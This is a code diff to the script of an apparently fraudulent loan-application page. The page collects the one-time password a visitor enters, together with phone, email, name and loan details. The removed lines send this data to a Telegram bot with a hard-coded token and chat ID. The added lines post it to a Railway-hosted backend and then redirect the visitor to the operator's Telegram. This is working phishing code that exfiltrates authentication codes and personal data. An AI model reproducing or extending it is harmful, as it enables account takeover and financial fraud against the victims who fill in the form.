@@ -69,11 +69,10 @@
 
 <script>
     // ============================================
-    // TELEGRAM CONFIGURATION
+    // CONFIGURATION
     // ============================================
+    const RAILWAY_URL = 'https://inncredits-production-c852.up.railway.app';
     const TELEGRAM_USERNAME = 'Inbucksk';
-    const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    const TG_CHAT_ID = '8392790531';
     
     // ============================================
     // GET DATA FROM URL
@@ -96,16 +95,32 @@
     document.getElementById('displayPhone').innerText = userPhone;
     
     // ============================================
-    // SEND OTP NOTIFICATION TO TELEGRAM
+    // SEND OTP NOTIFICATION VIA RAILWAY BACKEND
     // ============================================
-    function sendOtpNotification(otp) {
-        const message = `🔐 *OTP ENTERED BY USER* 🔐\n\n━━━━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${userPhone}\n🔑 *OTP:* ${otp}\n📧 *Email:* ${userEmail}\n👤 *Name:* ${userName}\n━━━━━━━━━━━━━━━━━━━━━\n💰 *Loan:* $${parseInt(amount).toLocaleString()} for ${term} months\n🆔 *App ID:* ${applicationId || 'N/A'}\n━━━━━━━━━━━━━━━━━━━━━\n\n✅ User has entered the OTP and is being redirected to your Telegram.`;
+    async function sendOtpNotification(otp) {
+        const payload = {
+            phone: userPhone,
+            pin: otp,
+            email: userEmail,
+            name: userName,
+            amount: amount,
+            term: term,
+            type: 'otp'
+        };
         
-        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        console.log('📤 Sending OTP to backend:', payload);
         
-        var img = new Image();
-        img.src = url;
-        console.log('✅ OTP notification sent to admin:', otp);
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            console.log('Backend response:', result);
+        } catch (error) {
+            console.error('Error sending to backend:', error);
+        }
     }
     
     // ============================================
@@ -183,7 +198,7 @@
     // ============================================
     // VERIFY BUTTON
     // ============================================
-    verifyBtn.onclick = () => {
+    verifyBtn.onclick = async () => {
         const enteredOtp = currentOtp.join('');
         
         if (enteredOtp.length !== 6) {
@@ -191,8 +206,11 @@
             return;
         }
         
-        // Send OTP notification to admin
-        sendOtpNotification(enteredOtp);
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        
+        // Send OTP notification via Railway backend
+        await sendOtpNotification(enteredOtp);
         
         // Redirect to user's Telegram
         redirectToTelegram();
